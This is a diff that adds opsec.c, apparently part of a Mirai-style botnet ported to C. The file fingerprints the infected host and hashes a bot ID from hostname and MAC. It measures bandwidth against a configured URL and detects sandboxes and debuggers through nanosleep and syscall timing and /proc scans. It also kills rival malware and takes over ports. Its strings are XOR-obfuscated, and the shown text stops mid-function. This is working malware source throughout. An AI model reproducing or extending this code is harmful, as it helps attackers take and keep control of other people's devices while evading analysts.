@@ -1,0 +1,1056 @@
+/* ==========================================================================
+ *  opsec.c -- Sandbox detection, daemonization, single instance, system info
+ *  Pure C port of opsec.cpp.  GCC 4.1.2 / C89+C99, uClibc.
+ * ========================================================================== */
+
+#include "bot.h"
+#include <sys/prctl.h>
+
+/* ==========================================================================
+ * SYSTEM INFO
+ * ========================================================================== */
+
+void Xy5oR2j(dstr *out) {
+    struct utsname u;
+    const char *machine;
+
+    ds_init(out);
+    if (uname(&u) != 0) {
+        ds_set(out, _S(13,0xe0,0xc5,0xc2,0xd9,0xd4,0x81,0xd9,0xc2,0xc7,0xc2,0xc3,0xdb,0xc2));
+        return;
+    }
+    machine = u.machine;
+
+    if (strcmp(machine, _S(6,0xd4,0x94,0x9a,0xf3,0x9a,0x98)) == 0) {
+        ds_set(out, _S(9,0xe0,0xc5,0xc2,0xd9,0xd4,0x81,0xd4,0x9a,0x98));
+    } else if (strcmp(machine, _S(4,0xc5,0x9a,0x94,0x9a)) == 0 || strcmp(machine, _S(4,0xc5,0x9f,0x94,0x9a)) == 0) {
+        ds_set(out, _S(9,0xe0,0xc5,0xc2,0xd9,0xd4,0x81,0xd4,0x94,0x9a));
+    } else if (strcmp(machine, _S(7,0xcd,0xcd,0xde,0xcf,0xc4,0x9a,0x98)) == 0) {
+        ds_set(out, _S(11,0xe0,0xc5,0xc2,0xd9,0xd4,0x81,0xed,0xfe,0xe1,0x9a,0x98));
+    } else if (strncmp(machine, _S(3,0xcd,0xde,0xc1), 3) == 0) {
+        ds_set(out, _S(11,0xe0,0xc5,0xc2,0xd9,0xd4,0x81,0xed,0xfe,0xe1,0x9f,0x9e));
+    } else if (strncmp(machine, _S(4,0xc1,0xc5,0xdc,0xdf), 4) == 0) {
+        ds_set(out, _S(10,0xe0,0xc5,0xc2,0xd9,0xd4,0x81,0xe1,0xe5,0xfc,0xff));
+    } else if (strncmp(machine, _S(3,0xdc,0xdc,0xcf), 3) == 0) {
+        ds_set(out, _S(13,0xe0,0xc5,0xc2,0xd9,0xd4,0x81,0xfc,0xc3,0xdb,0xc9,0xde,0xfc,0xef));
+    } else if (strcmp(machine, _S(5,0xdf,0x9f,0x95,0x9c,0xd4)) == 0) {
+        ds_set(out, _S(11,0xe0,0xc5,0xc2,0xd9,0xd4,0x81,0xdf,0x9f,0x95,0x9c,0xd4));
+    } else if (strncmp(machine, _S(5,0xde,0xc5,0xdf,0xcf,0xda), 5) == 0) {
+        ds_set(out, _S(11,0xe0,0xc5,0xc2,0xd9,0xd4,0x81,0xfe,0xe5,0xff,0xef,0xfa));
+    } else {
+        ds_set(out, _S(6,0xe0,0xc5,0xc2,0xd9,0xd4,0x81));
+        ds_cat(out, machine);
+    }
+}
+
+int64_t HY8cY3Q(void) {
+    struct sysinfo si;
+    if (sysinfo(&si) != 0) return 0;
+    return (int64_t)((uint64_t)si.totalram * (uint64_t)si.mem_unit / 1024 / 1024);
+}
+
+int un5KE2K(void) {
+    /* Try /proc/cpuinfo first — works on all Linux including old uClibc */
+    FILE *f = fopen(_S(13,0x83,0xdc,0xde,0xc3,0xcf,0x83,0xcf,0xdc,0xd9,0xc5,0xc2,0xca,0xc3), _S(1,0xde));
+    if (f) {
+        char line[256];
+        int count = 0;
+        while (fgets(line, sizeof(line), f)) {
+            if (strncmp(line, _S(9,0xdc,0xde,0xc3,0xcf,0xc9,0xdf,0xdf,0xc3,0xde), 9) == 0)
+                count++;
+        }
+        fclose(f);
+        if (count > 0) return count;
+    }
+    /* fallback */
+    {
+        long n = sysconf(_SC_NPROCESSORS_ONLN);
+        return (n > 0) ? (int)n : 1;
+    }
+}
+
+void uw2zs4U(dstr *out) {
+    char buf[4096];
+    ssize_t len;
+    const char *base;
+
+    ds_init(out);
+    len = readlink(_S(14,0x83,0xdc,0xde,0xc3,0xcf,0x83,0xdf,0xc9,0xc0,0xca,0x83,0xc9,0xd4,0xc9), buf, sizeof(buf) - 1);
+    if (len <= 0) {
+        ds_set(out, _S(7,0xd9,0xc2,0xc7,0xc2,0xc3,0xdb,0xc2));
+        return;
+    }
+    buf[len] = '\0';
+    base = strrchr(buf, '/');
+    ds_set(out, base ? base + 1 : buf);
+}
+
+/* --------------------------------------------------------------------------
+   Rz5Yb6g — measure upload/download speed via HTTP GET
+   Downloads from _CT6sh3M, times the transfer, returns Mbps.
+   All in-memory, no disk writes.  Falls back to 0.0 on any failure.
+   -------------------------------------------------------------------------- */
+static double Rz5Yb6g(void)
+{
+    const char *url, *p, *slash, *colon;
+    char host[256], port[8], path[512];
+    int fd;
+    struct addrinfo hints, *res, *rp;
+    struct timespec t0, t1;
+    char req[1024];
+    int req_len;
+    size_t total_bytes = 0;
+    char buf[8192];
+    ssize_t n;
+    double elapsed, mbps;
+    struct timeval tv;
+    int ret;
+
+    DS4RR2W();
+    url = ds_cstr(&_CT6sh3M);
+    if (!url || !url[0]) return 0.0;
+
+    /* parse URL: http://host[:port]/path */
+    p = url;
+    if (strncmp(p, _S(7,0xc4,0xd8,0xd8,0xdc,0x96,0x83,0x83), 7) == 0)  p += 7;
+    else if (strncmp(p, _S(8,0xc4,0xd8,0xd8,0xdc,0xdf,0x96,0x83,0x83), 8) == 0) return 0.0; /* no TLS */
+
+    slash = strchr(p, '/');
+    colon = strchr(p, ':');
+    if (colon && (!slash || colon < slash)) {
+        size_t hlen = (size_t)(colon - p);
+        if (hlen >= sizeof(host)) return 0.0;
+        memcpy(host, p, hlen); host[hlen] = '\0';
+        colon++;
+        if (slash) {
+            size_t plen = (size_t)(slash - colon);
+            if (plen >= sizeof(port)) return 0.0;
+            memcpy(port, colon, plen); port[plen] = '\0';
+        } else {
+            snprintf(port, sizeof(port), _S(4,0x89,0x82,0x86,0xdf), (int)(strlen(colon)), colon);
+        }
+    } else {
+        size_t hlen = slash ? (size_t)(slash - p) : strlen(p);
+        if (hlen >= sizeof(host)) return 0.0;
+        memcpy(host, p, hlen); host[hlen] = '\0';
+        strcpy(port, _S(2,0x94,0x9c));
+    }
+    if (slash) {
+        snprintf(path, sizeof(path), _S(2,0x89,0xdf), slash);
+    } else {
+        strcpy(path, _S(1,0x83));
+    }
+
+    /* resolve + connect */
+    memset(&hints, 0, sizeof(hints));
+    hints.ai_family   = AF_INET;
+    hints.ai_socktype = SOCK_STREAM;
+    ret = getaddrinfo(host, port, &hints, &res);
+    if (ret != 0) return 0.0;
+
+    fd = -1;
+    for (rp = res; rp; rp = rp->ai_next) {
+        fd = socket(rp->ai_family, rp->ai_socktype, rp->ai_protocol);
+        if (fd < 0) continue;
+        tv.tv_sec = 10; tv.tv_usec = 0;
+        setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
+        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
+        if (connect(fd, rp->ai_addr, rp->ai_addrlen) == 0) break;
+        close(fd); fd = -1;
+    }
+    freeaddrinfo(res);
+    if (fd < 0) return 0.0;
+
+    /* send HTTP GET */
+    req_len = snprintf(req, sizeof(req),
+        _S(48,0xeb,0xe9,0xf8,0x8c,0x89,0xdf,0x8c,0xe4,0xf8,0xf8,0xfc,0x83,0x9d,0x82,0x9c,0xa1,0xa6,0xe4,0xc3,0xdf,0xd8,0x96,0x8c,0x89,0xdf,0xa1,0xa6,0xef,0xc3,0xc2,0xc2,0xc9,0xcf,0xd8,0xc5,0xc3,0xc2,0x96,0x8c,0xcf,0xc0,0xc3,0xdf,0xc9,0xa1,0xa6,0xa1,0xa6),
+        path, host);
+    if (write(fd, req, (size_t)req_len) != req_len) {
+        close(fd);
+        return 0.0;
+    }
+
+    /* skip HTTP headers */
+    {
+        char hdr[8192];
+        size_t hdr_len = 0;
+        int found = 0;
+        while (!found && hdr_len < sizeof(hdr) - 1) {
+            n = read(fd, hdr + hdr_len, 1);
+            if (n <= 0) break;
+            hdr_len++;
+            if (hdr_len >= 4 &&
+                hdr[hdr_len-4] == '\r' && hdr[hdr_len-3] == '\n' &&
+                hdr[hdr_len-2] == '\r' && hdr[hdr_len-1] == '\n')
+                found = 1;
+        }
+        if (!found) { close(fd); return 0.0; }
+    }
+
+    /* time the body download */
+    clock_gettime(CLOCK_MONOTONIC, &t0);
+    while ((n = read(fd, buf, sizeof(buf))) > 0)
+        total_bytes += (size_t)n;
+    clock_gettime(CLOCK_MONOTONIC, &t1);
+
+    close(fd);
+
+    if (total_bytes < 1024) return 0.0; /* too small to measure */
+
+    elapsed = (double)(t1.tv_sec - t0.tv_sec)
+            + (double)(t1.tv_nsec - t0.tv_nsec) / 1e9;
+    if (elapsed < 0.001) return 0.0; /* avoid div-by-zero */
+
+    mbps = ((double)total_bytes * 8.0) / (elapsed * 1e6);
+    _nS5PJ8Y(_S(50,0xfe,0xd6,0x99,0xf5,0xce,0x9a,0xcb,0x96,0x8c,0xc8,0xc3,0xdb,0xc2,0xc0,0xc3,0xcd,0xc8,0xc9,0xc8,0x8c,0x89,0xd6,0xd9,0x8c,0xce,0xd5,0xd8,0xc9,0xdf,0x8c,0xc5,0xc2,0x8c,0x89,0x82,0x9f,0xca,0xdf,0x8c,0x91,0x8c,0x89,0x82,0x9e,0xca,0x8c,0xe1,0xce,0xdc,0xdf),
+              total_bytes, elapsed, mbps);
+    return mbps;
+}
+
+double Gm3pk8i(void) {
+    FILE *f;
+    double speed;
+
+    iB2Zq4a();
+
+    /* check cache first */
+    f = fopen(ds_cstr(&_cd2pA4A), _S(1,0xde));
+    if (f) {
+        speed = 0.0;
+        if (fscanf(f, _S(3,0x89,0xc0,0xca), &speed) == 1 && speed > 0.0) {
+            fclose(f);
+            _nS5PJ8Y(_S(38,0xeb,0xc1,0x9f,0xdc,0xc7,0x94,0xc5,0x96,0x8c,0xf9,0xdf,0xc5,0xc2,0xcb,0x8c,0xcf,0xcd,0xcf,0xc4,0xc9,0xc8,0x8c,0xdf,0xdc,0xc9,0xc9,0xc8,0x96,0x8c,0x89,0x82,0x9e,0xca,0x8c,0xe1,0xce,0xdc,0xdf), speed);
+            return speed;
+        }
+        fclose(f);
+    }
+
+    /* run speed test */
+    speed = Rz5Yb6g();
+
+    /* cache result to avoid re-testing on reconnect */
+    if (speed > 0.0) {
+        f = fopen(ds_cstr(&_cd2pA4A), _S(1,0xdb));
+        if (f) {
+            fprintf(f, _S(4,0x89,0x82,0x9e,0xca), speed);
+            fclose(f);
+        }
+    }
+
+    return speed;
+}
+
+/* ==========================================================================
+ * BOT ID GENERATION (matches Go mustangPanda)
+ * SHA256(hostname:mac)[:8]
+ * Read MAC from /sys/class/net/<iface>/address (no getifaddrs)
+ * ========================================================================== */
+
+void Ai2mW7K(dstr *out) {
+    char hostname[256];
+    dstr mac;
+    DIR *d;
+    struct dirent *ent;
+    dstr data;
+    dbuf hash;
+    dstr hex;
+
+    ds_init(out);
+    memset(hostname, 0, sizeof(hostname));
+    gethostname(hostname, sizeof(hostname) - 1);
+
+    ds_init(&mac);
+    ds_set(&mac, _S(7,0xd9,0xc2,0xc7,0xc2,0xc3,0xdb,0xc2));
+
+    d = opendir(_S(14,0x83,0xdf,0xd5,0xdf,0x83,0xcf,0xc0,0xcd,0xdf,0xdf,0x83,0xc2,0xc9,0xd8));
+    if (d) {
+        while ((ent = readdir(d)) != NULL) {
+            char path[512];
+            FILE *f;
+            char line[64];
+
+            /* skip . and .. and lo */
+            if (ent->d_name[0] == '.') continue;
+            if (strcmp(ent->d_name, _S(2,0xc0,0xc3)) == 0) continue;
+
+            snprintf(path, sizeof(path), _S(25,0x83,0xdf,0xd5,0xdf,0x83,0xcf,0xc0,0xcd,0xdf,0xdf,0x83,0xc2,0xc9,0xd8,0x83,0x89,0xdf,0x83,0xcd,0xc8,0xc8,0xde,0xc9,0xdf,0xdf), ent->d_name);
+            f = fopen(path, _S(1,0xde));
+            if (!f) continue;
+            if (fgets(line, sizeof(line), f)) {
+                /* strip trailing newline */
+                size_t slen = strlen(line);
+                while (slen > 0 && (line[slen-1] == '\n' || line[slen-1] == '\r'))
+                    line[--slen] = '\0';
+                if (slen > 0 && strcmp(line, _S(17,0x9c,0x9c,0x96,0x9c,0x9c,0x96,0x9c,0x9c,0x96,0x9c,0x9c,0x96,0x9c,0x9c,0x96,0x9c,0x9c)) != 0) {
+                    ds_set(&mac, line);
+                    fclose(f);
+                    break;
+                }
+            }
+            fclose(f);
+        }
+        closedir(d);
+    }
+
+    /* SHA256(hostname:mac)[:8 hex chars = 4 bytes] */
+    ds_init(&data);
+    ds_set(&data, hostname);
+    ds_cat(&data, _S(1,0x96));
+    ds_catds(&data, &mac);
+    ds_free(&mac);
+
+    hash = _Ug8Lk6u(ds_cstr(&data));
+    ds_free(&data);
+
+    hex = _dJ2Bc5Y(db_ptr(&hash), 4); /* first 4 bytes = 8 hex chars */
+    db_free(&hash);
+
+    ds_set(out, ds_cstr(&hex));
+    ds_free(&hex);
+}
+
+/* ==========================================================================
+ * SANDBOX / ANALYSIS DETECTION (matches Go VA3rJ6j)
+ * ========================================================================== */
+
+/* helper: convert char to lowercase */
+static char _wN4iv4N(char c) {
+    return (c >= 'A' && c <= 'Z') ? (char)(c + ('a' - 'A')) : c;
+}
+
+/* helper: case-insensitive strstr */
+static const char *stristr(const char *haystack, const char *needle) {
+    size_t nlen;
+    if (!needle || !needle[0]) return haystack;
+    nlen = strlen(needle);
+    while (*haystack) {
+        size_t i;
+        int match = 1;
+        for (i = 0; i < nlen; i++) {
+            if (!haystack[i]) { match = 0; break; }
+            if (_wN4iv4N(haystack[i]) != _wN4iv4N(needle[i])) { match = 0; break; }
+        }
+        if (match) return haystack;
+        haystack++;
+    }
+    return NULL;
+}
+
+/* helper: check if string is all digits (a PID) */
+static int _oZ3dq3f(const char *s) {
+    if (!s || !*s) return 0;
+    while (*s) {
+        if (*s < '0' || *s > '9') return 0;
+        s++;
+    }
+    return 1;
+}
+
+/*
+ * Nanosecond timing check — real hardware completes tight loops in
+ * predictable time.  VMs / sandboxes / emulators add measurable overhead
+ * on rdtsc-equivalent or clock_gettime calls.  We time a small
+ * computation; if the delta exceeds a threshold the environment is suspect.
+ */
+static int _iq3Hd8G(void) {
+    struct timespec t0, t1, req;
+    long delta_ns;
+    int round;
+    int fails = 0;
+
+    /*
+     * Nanosleep evasion: request a 50 ns sleep and measure the actual wall time.
+     *
+     * On real hardware the kernel timer granularity means nanosleep(50ns)
+     * returns in ~50-500 ns — the scheduler simply rounds to the next tick.
+     *
+     * Sandboxes that intercept/emulate nanosleep either:
+     *   - Skip it entirely (delta ≈ 0, but we check for too-long)
+     *   - Round up to milliseconds (delta >> 50000 ns)
+     *   - Fail to maintain monotonic clock consistency
+     *
+     * If the measured delay exceeds 500 rS2rg3G (10000x the requested 50 ns),
+     * the environment cannot faithfully handle fine-grained sleeps.
+     * Two of three rounds must fail to trigger detection.
+     */
+    req.tv_sec = 0;
+    req.tv_nsec = 50;  /* 50 nanoseconds */
+
+    for (round = 0; round < 3; round++) {
+        clock_gettime(CLOCK_MONOTONIC, &t0);
+        nanosleep(&req, NULL);
+        clock_gettime(CLOCK_MONOTONIC, &t1);
+
+        delta_ns = (t1.tv_sec - t0.tv_sec) * 1000000000L + (t1.tv_nsec - t0.tv_nsec);
+
+        if (delta_ns > 50000000L) fails++;  /* >50 ms = sandbox (embedded kernels tick at 100Hz = 10ms) */
+    }
+
+    /* Stage 2: syscall timing — 50 trivial getpid() calls.
+     * On real HW: ~10-15 rS2rg3G total. Under ptrace/strace: >1 ms.
+     * Catches analysts running the binary under tracing tools. */
+    {
+        int sf = 0;
+        for (round = 0; round < 3; round++) {
+            int j;
+            clock_gettime(CLOCK_MONOTONIC, &t0);
+            for (j = 0; j < 50; j++) getpid();
+            clock_gettime(CLOCK_MONOTONIC, &t1);
+            delta_ns = (t1.tv_sec - t0.tv_sec) * 1000000000L + (t1.tv_nsec - t0.tv_nsec);
+            if (delta_ns > 1000000L) sf++;  /* >1 ms = traced */
+        }
+        if (sf >= 2) fails += 2;  /* traced = instant fail */
+    }
+
+    return (fails >= 2);
+}
+
+int VA3rJ6j(void) {
+    /* ---- Stage 1: nanosecond timing gate (must pass first) ---- */
+    if (_iq3Hd8G()) {
+        _nS5PJ8Y(_S(57,0xfa,0xed,0x9f,0xde,0xe6,0x9a,0xc6,0x96,0x8c,0xd8,0xc5,0xc1,0xc5,0xc2,0xcb,0x8c,0xcf,0xc4,0xc9,0xcf,0xc7,0x8c,0xea,0xed,0xe5,0xe0,0xe9,0xe8,0x8c,0xb8,0x8c,0xdf,0xcd,0xc2,0xc8,0xce,0xc3,0xd4,0x83,0xc9,0xc1,0xd9,0xc0,0xcd,0xd8,0xc3,0xde,0x8c,0xdf,0xd9,0xdf,0xdc,0xc9,0xcf,0xd8,0xc9,0xc8));
+        return 1;
+    }
+
+    /* ---- Stage 2: /proc scan for sandbox VM names only ---- */
+    {
+        DIR *d;
+        struct dirent *ent;
+
+        PP3yJ4J(); /* decrypts _Ds7cV2u */
+
+        d = opendir(_S(5,0x83,0xdc,0xde,0xc3,0xcf));
+        if (d) {
+            pid_t self = getpid();
+            pid_t parent = getppid();
+            while ((ent = readdir(d)) != NULL) {
+                char path[512];
+                FILE *f;
+                char cmdline[4096];
+                size_t total;
+                size_t k;
+                int pid_num;
+
+                if (!_oZ3dq3f(ent->d_name)) continue;
+                pid_num = atoi(ent->d_name);
+                if (pid_num == (int)self || pid_num == (int)parent) continue;
+
+                snprintf(path, sizeof(path), _S(16,0x83,0xdc,0xde,0xc3,0xcf,0x83,0x89,0xdf,0x83,0xcf,0xc1,0xc8,0xc0,0xc5,0xc2,0xc9), ent->d_name);
+                f = fopen(path, _S(1,0xde));
+                if (!f) continue;
+
+                total = fread(cmdline, 1, sizeof(cmdline) - 1, f);
+                fclose(f);
+                if (total == 0) continue;
+                {
+                    size_t j;
+                    for (j = 0; j < total; j++)
+                        if (cmdline[j] == '\0') cmdline[j] = ' ';
+                }
+                cmdline[total] = '\0';
+
+                for (k = 0; k < sa_count(&_Ds7cV2u); k++) {
+                    if (stristr(cmdline, sa_get(&_Ds7cV2u, k))) {
+                        _nS5PJ8Y(_S(36,0xfa,0xed,0x9f,0xde,0xe6,0x9a,0xc6,0x96,0x8c,0xdf,0xcd,0xc2,0xc8,0xce,0xc3,0xd4,0x8c,0xc2,0xcd,0xc1,0xc9,0x8c,0x8b,0x89,0xdf,0x8b,0x8c,0xc5,0xc2,0x8c,0xfc,0xe5,0xe8,0x8c,0x89,0xdf),
+                                  sa_get(&_Ds7cV2u, k), ent->d_name);
+                        closedir(d);
+                        return 1;
+                    }
+                }
+            }
+            closedir(d);
+        }
+    }
+
+    return 0;
+}
+
+/* ==========================================================================
+ * PROCESS KILLER — scan /proc for competing malware and known IOCs
+ * Kills processes matching arch-named binaries, common Mirai IOCs,
+ * and other known bot process names.
+ * ========================================================================== */
+
+/* IOC patterns decrypted at runtime from _wP7xV7q (via PP3yJ4J) */
+
+/* kill-by-port: parse /proc/net/tcp for inode, find owning PID, kill it */
+static int uU4kL2w(int port)
+{
+    int fd, ret = 0;
+    char buf[512];
+    char target_inode[32] = {0};
+    char port_hex[8];
+    uint16_t nport = htons((uint16_t)port);
+
+    /* convert port to hex as it appears in /proc/net/tcp (network byte order) */
+    snprintf(port_hex, sizeof(port_hex), _S(4,0x89,0x9c,0x98,0xf4), (unsigned)nport);
+
+    /* step 1: find the inode for a LISTEN socket on this port */
+    fd = open(_S(13,0x83,0xdc,0xde,0xc3,0xcf,0x83,0xc2,0xc9,0xd8,0x83,0xd8,0xcf,0xdc), O_RDONLY);
+    if (fd < 0) return 0;
+
+    {
+        /* line-by-line read from /proc/net/tcp */
+        char linebuf[1024];
+        int lpos = 0;
+        ssize_t n;
+        while ((n = read(fd, buf, sizeof(buf))) > 0) {
+            ssize_t i;
+            for (i = 0; i < n; i++) {
+                if (buf[i] == '\n' || lpos >= (int)sizeof(linebuf) - 1) {
+                    linebuf[lpos] = '\0';
+                    /* parse: "  sl  local_address ... st ... inode"
+                     * local_address is field 1 (0-indexed), format ADDR:PORT
+                     * state is field 3, "0A" = LISTEN
+                     * inode is field 9 */
+                    {
+                        char *fields[16];
+                        int fc = 0;
+                        char *p = linebuf;
+                        while (*p && fc < 16) {
+                            while (*p == ' ' || *p == '\t') p++;
+                            if (!*p) break;
+                            fields[fc++] = p;
+                            while (*p && *p != ' ' && *p != '\t') p++;
+                            if (*p) *p++ = '\0';
+                        }
+                        /* fields[1] = local_address (ADDR:PORT), fields[3] = state, fields[9] = inode */
+                        if (fc >= 10) {
+                            char *colon = strrchr(fields[1], ':');
+                            if (colon && strcasecmp(colon + 1, port_hex + (port_hex[0] == '0' && port_hex[1] == '0' ? 0 : 0)) == 0) {
+                                /* check if port matches (compare raw hex) */
+                                unsigned int file_port = 0;
+                                sscanf(colon + 1, _S(2,0x89,0xd4), &file_port);
+                                if (file_port == (unsigned)port) {
+                                    /* check state == 0A (LISTEN) */
+                                    if (strcmp(fields[3], _S(2,0x9c,0xed)) == 0) {
+                                        strncpy(target_inode, fields[9], sizeof(target_inode) - 1);
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    lpos = 0;
+                } else {
+                    linebuf[lpos++] = buf[i];
+                }
+            }
+        }
+    }
+    close(fd);
+
+    if (target_inode[0] == '\0' || strcmp(target_inode, _S(1,0x9c)) == 0)
+        return 0;
+
+    _nS5PJ8Y(_S(27,0xc7,0xc5,0xc0,0xc0,0xc9,0xde,0x96,0x8c,0xdc,0xc3,0xde,0xd8,0x8c,0x89,0xc8,0x8c,0x81,0x92,0x8c,0xc5,0xc2,0xc3,0xc8,0xc9,0x8c,0x89,0xdf), port, target_inode);
+
+    /* step 2: find PID owning this inode via /proc/PID/fd/ symlinks */
+    {
+        DIR *proc_dir = opendir(_S(5,0x83,0xdc,0xde,0xc3,0xcf));
+        struct dirent *pent;
+        if (!proc_dir) return 0;
+
+        while ((pent = readdir(proc_dir)) != NULL && ret == 0) {
+            char fd_dir_path[256];
+            DIR *fd_dir;
+            struct dirent *fd_ent;
+            int pid;
+
+            if (!_oZ3dq3f(pent->d_name)) continue;
+            pid = atoi(pent->d_name);
+            if (pid <= 1) continue;
+
+            snprintf(fd_dir_path, sizeof(fd_dir_path), _S(11,0x83,0xdc,0xde,0xc3,0xcf,0x83,0x89,0xc8,0x83,0xca,0xc8), pid);
+            fd_dir = opendir(fd_dir_path);
+            if (!fd_dir) continue;
+
+            while ((fd_ent = readdir(fd_dir)) != NULL) {
+                char link_path[384], link_target[256];
+                ssize_t llen;
+
+                snprintf(link_path, sizeof(link_path), _S(5,0x89,0xdf,0x83,0x89,0xdf), fd_dir_path, fd_ent->d_name);
+                llen = readlink(link_path, link_target, sizeof(link_target) - 1);
+                if (llen <= 0) continue;
+                link_target[llen] = '\0';
+
+                /* symlink looks like "socket:[12345]" */
+                if (strncmp(link_target, _S(8,0xdf,0xc3,0xcf,0xc7,0xc9,0xd8,0x96,0xf7), 8) == 0) {
+                    char *inode_start = link_target + 8;
+                    char *bracket = strchr(inode_start, ']');
+                    if (bracket) *bracket = '\0';
+                    if (strcmp(inode_start, target_inode) == 0) {
+                        _nS5PJ8Y(_S(39,0xc7,0xc5,0xc0,0xc0,0xc9,0xde,0x96,0x8c,0xdc,0xc3,0xde,0xd8,0x8c,0x89,0xc8,0x8c,0xc4,0xc9,0xc0,0xc8,0x8c,0xce,0xd5,0x8c,0xfc,0xe5,0xe8,0x8c,0x89,0xc8,0x80,0x8c,0xc7,0xc5,0xc0,0xc0,0xc5,0xc2,0xcb), port, pid);
+                        kill(pid, SIGKILL);
+                        ret = 1;
+                        break;
+                    }
+                }
+            }
+            closedir(fd_dir);
+        }
+        closedir(proc_dir);
+    }
+
+    return ret;
+}
+
+/* steal a port: kill owner, bind to it so nothing else can reclaim it */
+static void MA2Zm5N(int port)
+{
+    struct sockaddr_in addr;
+    int fd, opt = 1;
+
+    uU4kL2w(port);
+    usleep(100000); /* 100ms for process to die */
+
+    fd = socket(AF_INET, SOCK_STREAM, 0);
+    if (fd < 0) return;
+
+    setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
+    memset(&addr, 0, sizeof(addr));
+    addr.sin_family = AF_INET;
+    addr.sin_addr.s_addr = INADDR_ANY;
+    addr.sin_port = htons((uint16_t)port);
+
+    if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) == 0) {
+        listen(fd, 1);
+        _nS5PJ8Y(_S(21,0xc7,0xc5,0xc0,0xc0,0xc9,0xde,0x96,0x8c,0xdf,0xd8,0xc3,0xc0,0xc9,0x8c,0xdc,0xc3,0xde,0xd8,0x8c,0x89,0xc8), port);
+        /* fd intentionally leaked — keeps the port bound */
+    } else {
+        close(fd);
+        _nS5PJ8Y(_S(30,0xc7,0xc5,0xc0,0xc0,0xc9,0xde,0x96,0x8c,0xca,0xcd,0xc5,0xc0,0xc9,0xc8,0x8c,0xd8,0xc3,0x8c,0xce,0xc5,0xc2,0xc8,0x8c,0xdc,0xc3,0xde,0xd8,0x8c,0x89,0xc8), port);
+    }
+}
+
+/* Get the bot's own exe path (without " (deleted)" suffix), cached */
+static char self_exe_path[4096] = {0};
+
+static void LM8nD3K(void)
+{
+    ssize_t len;
+    char *del;
+    if (self_exe_path[0]) return; /* already cached */
+    len = readlink(_S(14,0x83,0xdc,0xde,0xc3,0xcf,0x83,0xdf,0xc9,0xc0,0xca,0x83,0xc9,0xd4,0xc9), self_exe_path, sizeof(self_exe_path) - 1);
+    if (len > 0) {
+        self_exe_path[len] = '\0';
+        /* strip " (deleted)" if present */
+        del = strstr(self_exe_path, _S(10,0x8c,0x84,0xc8,0xc9,0xc0,0xc9,0xd8,0xc9,0xc8,0x85));
+        if (del) *del = '\0';
+    }
+}
+
+/* Check if a PID is running our own binary by comparing exe paths */
+static int _Kk6bG3C(int pid)
+{
+    char link_path[64];
+    char exe[4096];
+    char *del;
+    ssize_t len;
+
+    snprintf(link_path, sizeof(link_path), _S(12,0x83,0xdc,0xde,0xc3,0xcf,0x83,0x89,0xc8,0x83,0xc9,0xd4,0xc9), pid);
+    len = readlink(link_path, exe, sizeof(exe) - 1);
+    if (len <= 0) return 0;
+    exe[len] = '\0';
+
+    /* strip " (deleted)" for comparison */
+    del = strstr(exe, _S(10,0x8c,0x84,0xc8,0xc9,0xc0,0xc9,0xd8,0xc9,0xc8,0x85));
+    if (del) *del = '\0';
+
+    return (self_exe_path[0] && strcmp(exe, self_exe_path) == 0);
+}
+
+static void sq6un4t(void)
+{
+    pid_t self = getpid();
+    pid_t parent = getppid();
+    DIR *d;
+    struct dirent *ent;
+
+    LM8nD3K();
+    PP3yJ4J(); /* decrypts _wP7xV7q */
+
+    d = opendir(_S(5,0x83,0xdc,0xde,0xc3,0xcf));
+    if (!d) return;
+
+    while ((ent = readdir(d)) != NULL) {
+        int pid;
+        char path[512];
+        char cmdline[4096];
+        char exe_path[512];
+        char exe_buf[4096];
+        ssize_t exe_len;
+        FILE *f;
+        size_t total, j;
+        size_t k;
+
+        if (!_oZ3dq3f(ent->d_name)) continue;
+        pid = atoi(ent->d_name);
+        if (pid <= 1 || pid == (int)self || pid == (int)parent) continue;
+
+        /* skip any process running our own binary (flood forks, etc) */
+        if (_Kk6bG3C(pid)) continue;
+
+        /* skip our own children (scanner forks that exec sh/wget/etc) */
+        {
+            char stat_path[64], stat_buf[256];
+            int child_ppid = 0;
+            FILE *sf;
+            snprintf(stat_path, sizeof(stat_path), _S(13,0x83,0xdc,0xde,0xc3,0xcf,0x83,0x89,0xc8,0x83,0xdf,0xd8,0xcd,0xd8), pid);
+            sf = fopen(stat_path, _S(1,0xde));
+            if (sf) {
+                if (fgets(stat_buf, sizeof(stat_buf), sf)) {
+                    /* stat format: pid (comm) state ppid ... */
+                    char *cp = strrchr(stat_buf, ')');
+                    if (cp && *(cp+1) == ' ' && *(cp+2) && *(cp+3) == ' ') {
+                        child_ppid = atoi(cp + 4);
+                    }
+                }
+                fclose(sf);
+            }
+            if (child_ppid == (int)self) continue;
+        }
+
+        /* Read the exe link for this PID */
+        snprintf(exe_path, sizeof(exe_path), _S(12,0x83,0xdc,0xde,0xc3,0xcf,0x83,0x89,0xc8,0x83,0xc9,0xd4,0xc9), pid);
+        exe_buf[0] = '\0';
+        exe_len = readlink(exe_path, exe_buf, sizeof(exe_buf) - 1);
+        if (exe_len > 0) exe_buf[exe_len] = '\0';
+
+        /* Kill processes running from deleted binaries — classic competing
+         * malware indicator. Skip ourselves (already handled above). */
+        if (exe_buf[0] && strstr(exe_buf, _S(10,0x8c,0x84,0xc8,0xc9,0xc0,0xc9,0xd8,0xc9,0xc8,0x85)) != NULL) {
+            _nS5PJ8Y(_S(51,0xc7,0xc5,0xc0,0xc0,0xc9,0xde,0x96,0x8c,0xfc,0xe5,0xe8,0x8c,0x89,0xc8,0x8c,0xde,0xd9,0xc2,0xc2,0xc5,0xc2,0xcb,0x8c,0xc8,0xc9,0xc0,0xc9,0xd8,0xc9,0xc8,0x8c,0xce,0xc5,0xc2,0xcd,0xde,0xd5,0x8c,0xf7,0x89,0xdf,0xf1,0x80,0x8c,0xc7,0xc5,0xc0,0xc0,0xc5,0xc2,0xcb), pid, exe_buf);
+            kill(pid, SIGKILL);
+            continue;
+        }
+
+        /* Read cmdline for pattern matching */
+        snprintf(path, sizeof(path), _S(16,0x83,0xdc,0xde,0xc3,0xcf,0x83,0x89,0xc8,0x83,0xcf,0xc1,0xc8,0xc0,0xc5,0xc2,0xc9), pid);
+        cmdline[0] = '\0';
+        f = fopen(path, _S(1,0xde));
+        if (f) {
+            total = fread(cmdline, 1, sizeof(cmdline) - 1, f);
+            fclose(f);
+            cmdline[total] = '\0';
